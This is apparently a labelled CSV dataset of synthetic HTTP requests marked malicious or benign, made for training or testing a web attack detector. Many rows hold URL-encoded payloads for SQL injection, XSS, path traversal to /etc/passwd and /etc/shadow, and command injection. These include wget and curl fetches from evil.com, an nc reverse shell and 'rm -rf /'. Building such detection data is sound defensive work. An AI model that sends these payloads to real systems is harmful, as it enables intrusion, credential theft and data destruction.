text,label
PATCH /login filter=123%20%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E%20attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /help/faq category=897&filters=best%20%27%20AND%20%27x%27%3D%27y%20comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /about?username=contact+me+at+email@example.com&columns=107&password=please%20%27%20OR%20%271%27%3D%271%27--%20comment&session=349 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /api/search order_id=%3Csvg/onload%3Dalert%281%29%3E&tracking=343 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /dashboard?search_term=118&limit=461&order_id=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /api/reports?age=821&limit=test%20%24%28cat%20/etc/shadow%29%20request User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /api/v1/data tracking=49&limit=32&title=657 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PUT /products/123 color=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E&limit=574&user_id=892&price_min=please+find+attached&author=736 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /js/app.js?author=123%20%24%28cat%20/etc/shadow%29%20St&order=791&password=123+Main+St User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /api/reports?title=admin+access+request&order_id=test%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20request&type=690 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /js/app.js?view=I+would+like+to+order&q=66&search=my+address+is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PUT /api/reports email=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /api/v1/data comment=529&q=best%20%27%3B%20SELECT%20pg_sleep%285%29--%20email%40example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /images/logo.png?phone=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /api/orders last_name=I+would+like+to+order&user_id=909&tracking=I+would+like+to+order&color=918&product_id=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/users?tags=614&category=hello+world&quantity=system+log+entry&action=456 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /images/logo.png token=484 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /contact?age=%3Cbody%20onload%3Dalert%28document.domain%29%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /api/orders new_password=969&comment=I+would+like+to+order&search_term=best+regards&filter=system+log+entry User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /js/app.js?filters=%3B%20wget%20http%3A//evil.com/shell.sh&username=thank+you&order_id=my+address+is&tag=admin+access+request&last_name=563 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /posts/789?date=system+log+entry&search_term=contact%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20regards&title=841&last_name=538 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /js/app.js?token=124&action=thank%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20entry User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /dashboard id=John+Doe&first_name=....//....//....//etc/passwd User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /contact?price_min=hello+world&sort=best%20%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--%20user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /docs/api password=789&view=system+log+entry&price_max=11&tracking=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /api/v1/data first_name=I+would+like+to+order&page=best+regards&new_password=133&price_min=my+address+is&phone=admin%27%20OR%20%271%27%3D%271 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /api/orders?columns=%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27-- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /api/orders?price_min=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&session=862 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /api/search?search_term=%3Csvg/onload%3Dalert%281%29%3E&user_id=858 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /api/users search=test%20%27%20AND%201%3D2--%20you&order_id=test+user&quantity=test+user&filter=this+is+a+normal+comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /users/456?age=test+user&action=contact+me+at+email@example.com&rating=my+address+is&last_name=hello+world&region=262 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PATCH /api/users old_password=I+would+like+to+order&id=790&search_term=contact+me+at+email@example.com&price_max=969&session=admin%20%27%20AND%20%27x%27%3D%27x%20comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /api/users?email=284&q=/var/www/../../etc/passwd User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /api/v1/data user_id=admin+access+request&password=123%20%27%20AND%201%3D2--%20Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /about?search_term=I+would+like+to+order&session=%27%20AND%20extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--&category=I+would+like+to+order User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /products/123 new_password=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /docs/api?view=admin%27/%2A&email=thank+you&password=361 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /settings?email=hello%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20is&tag=484 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /register?title=206&tracking=hello%20admin%27/%2A%20St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /api/orders format=test+user&type=this%20%27%20AND%20SLEEP%285%29--%20request&status=123+Main+St User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /api/search?tags=test+user&q=684&age=%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60&limit=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /js/app.js content=306&age=248&date=best%20%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20Doe&password=109&status=929 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /js/app.js search=admin+access+request&city=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&order_id=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /register action=John+Doe&user_id=thank+you&lang=723&tags=test%20admin%27%23%20user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/users?title=John+Doe&id=test+user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /api/users?content=admin%27%23&quantity=680&product_id=884 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /login?search=685&old_password=366&username=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /dashboard last_name=system%20%27%20OR%201%3D1--%20user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /api/search?title=356&password=754&content=thank+you&order=test+user&token=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /login format=admin+access+request&first_name=hello+world&limit=please+find+attached&new_password=this%20%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%20comment&order_id=65 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/reports author=123%20%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E%20order&first_name=I+would+like+to+order&tracking=hello+world&password=482 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /dashboard?sort=618&filter=43&order_id=902&quantity=test%201%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--%20St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /products/123?product_id=936&new_password=admin%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /contact filters=922&password=test%20%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%20request&price_min=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /users/456?tag=test+user&old_password=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&quantity=714&type=441&new_password=850 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /docs/api quantity=best+regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
DELETE /contact?username=516&tags=793&title=511 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /help/faq?user_id=hello%20%7C%20cat%20/etc/passwd%20attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /profile?phone=thank%20%3B%20ls%20-la%20user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /css/style.css view=650&token=968&filter=I%20%26%20whoami%20world User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /dashboard?password=admin%27--&category=123+Main+St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /js/app.js?category=44&username=admin%27/%2A&city=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /help/faq?search_term=test+user&price_min=best+regards&filter=please+find+attached&name=thank+you&new_password=420 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /products/123?old_password=449&type=592&rating=894&search_term=best+regards User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /about?title=this+is+a+normal+comment&quantity=477&view=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /api/reports?type=42&search_term=344&rating=380&sort=contact+me+at+email@example.com&id=admin+access+request User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /js/app.js email=910&order_id=test+user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /api/search new_password=846&session=system+log+entry&sort=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/reports?color=56 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /register?new_password=system+log+entry&age=best+regards&filter=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /api/search?first_name=679&filter=I+would+like+to+order&name=system+log+entry&comment=688 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /api/v1/data?tracking=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&email=196&region=John+Doe&session=596 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /dashboard?category=686&title=74&id=202 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /api/v2/analytics?type=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam&session=my+address+is User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /api/orders first_name=123%20%7C%20curl%20http%3A//evil.com/backdoor%20regards&color=this+is+a+normal+comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /js/app.js?first_name=9&page=my+address+is&price_max=%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--&action=I+would+like+to+order&date=John+Doe User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /login?tags=123%20../../../etc/passwd%20attached User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /api/users?content=123+Main+St&tag=444&order_id=459&category=%27%3B%20DROP%20TABLE%20users--&token=123+Main+St User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /profile lang=hello%20%27%20OR%201%3D1--%20St&id=377 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /images/logo.png format=John+Doe&token=this+is+a+normal+comment&quantity=system%20%3Csvg/onload%3Dalert%281%29%3E%20attached&product_id=950 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /js/app.js region=38&session=127&action=969&first_name=system+log+entry User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
HEAD /users/456?color=admin+access+request&search_term=%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29&last_name=this+is+a+normal+comment&search=3&user_id=18 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /settings lang=please+find+attached&last_name=admin+access+request&view=198 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /login?page=my+address+is&category=I+would+like+to+order&product_id=....//....//....//etc/passwd&search=243 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /docs/api?filters=test+user&phone=test+user&sort=system+log+entry&type=system+log+entry&q=844 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /about?email=best+regards&region=this+is+a+normal+comment&order_id=hello+world User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /api/products?search_term=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&token=thank+you&action=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /posts/789?filters=951&password=%27%20AND%20SLEEP%285%29-- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /products/123?price_min=805&columns=system+log+entry&password=764&filter=295 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
DELETE /api/search?id=system+log+entry&token=hello+world&last_name=62&date=please%20%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--%20request&tracking=my+address+is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /css/style.css email=434&format=file%3A///etc/passwd&age=I+would+like+to+order User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /js/app.js?name=65&author=321&lang=%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /api/orders first_name=admin%27%20OR%20%271%27%3D%271&q=92 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /api/v1/data rating=best+regards&view=224 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /api/orders?filters=943&age=please%20..%25252f..%25252f..%25252fetc%25252fpasswd%20user User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /api/reports?product_id=John+Doe&status=736&sort=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /api/products filters=admin%20%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E%20comment User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/users tracking=%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /docs/api?price_max=system+log+entry&tracking=659&phone=545&email=852&password=I+would+like+to+order User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /css/style.css?first_name=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&page=339&rating=144 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /css/style.css?tracking=858&phone=this+is+a+normal+comment&author=this%20%27%20AND%201%3D1--%20is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/products?password=thank+you&last_name=29&age=contact%20%26%20%24%28which%20bash%29%20-c%20%27ls%27%20you&rating=988 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /help/faq phone=699&category=my+address+is&price_min=477&search=admin+access+request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /api/v1/data color=hello%20%27%3B%20DROP%20TABLE%20users--%20Doe&status=test+user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /api/v1/data?price_min=this+is+a+normal+comment&order=39&view=682&date=647 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /docs/api?rating=my+address+is&user_id=thank+you&comment=205&category=997 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /images/logo.png limit=602&view=123+Main+St&email=system+log+entry User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /settings?id=best+regards&last_name=123+Main+St&date=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E&filter=708&page=580 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /api/users category=779&date=thank+you&filter=123+Main+St&q=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /docs/api?type=%26%20nc%20-e%20/bin/bash%20evil.com%204444 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /users/456?phone=hello+world&order=%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /api/v2/analytics id=%3B%20ls%20-la User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /login session=185&product_id=admin%27%23 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /profile search=180&search_term=40&new_password=please+find+attached&color=my+address+is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /settings?token=584&tag=313&filter=256 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
HEAD /api/search?password=please+find+attached User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /register filters=271 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /profile columns=226&tag=best%20..%25252f..%25252f..%25252fetc%25252fpasswd%20world&region=230&status=397 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /api/users product_id=%27%20AND%20%27x%27%3D%27x User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /docs/api page=673&action=191&token=357&password=199&rating=%3B%20rm%20-rf%20/ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /dashboard rating=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E&phone=test+user&id=838 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /products/123 order_id=hello+world&session=267&price_max=I%20%3Csvg/onload%3Dalert%281%29%3E%20attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /contact user_id=contact+me+at+email@example.com&category=test+user&product_id=please+find+attached&price_max=337&status=..%25252f..%25252f..%25252fetc%25252fpasswd User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /api/reports?filter=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&session=881&lang=853 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /register lang=test+user&search_term=970&last_name=John%20%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL--%20is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /dashboard?filters=hello+world&order_id=%3Cbody%20onload%3Dalert%28document.domain%29%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /profile?product_id=I%20%27%20AND%20SLEEP%285%29--%20entry User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /images/logo.png rating=this%20%3Csvg/onload%3Dalert%281%29%3E%20email%40example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /images/logo.png format=hello+world&password=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
OPTIONS /products/123?view=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /images/logo.png format=489&page=please+find+attached&search=contact+me+at+email@example.com&username=%27%20AND%20extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--&view=best+regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /about?view=%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1-- User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /api/reports?filter=540&date=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&old_password=123+Main+St User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /css/style.css?password=contact%20%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%20regards&color=261&category=admin+access+request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /register?view=I%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20order User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/v2/analytics rating=I+would+like+to+order&first_name=561 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /images/logo.png password=461 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /api/v2/analytics?username=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&search_term=I+would+like+to+order User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /login price_max=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /api/search?action=752&comment=contact+me+at+email@example.com&sort=%3B%20wget%20http%3A//evil.com/shell.sh&order_id=system+log+entry User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /css/style.css tracking=hello+world&status=system%20%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%20order User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /api/v1/data?q=..%25252f..%25252f..%25252fetc%25252fpasswd User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/reports?phone=123+Main+St&category=%3Csvg%20onload%3Dalert%281%29%3E&filter=790 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /users/456 id=..%25252f..%25252f..%25252fetc%25252fpasswd&tags=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /css/style.css?lang=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--&tag=668 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /images/logo.png?filter=182&region=contact+me+at+email@example.com&age=system%20%27%20AND%20%27x%27%3D%27x%20attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /contact color=%7Cawk%20%27%7Bprint%20%241%7D%27%20/etc/passwd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
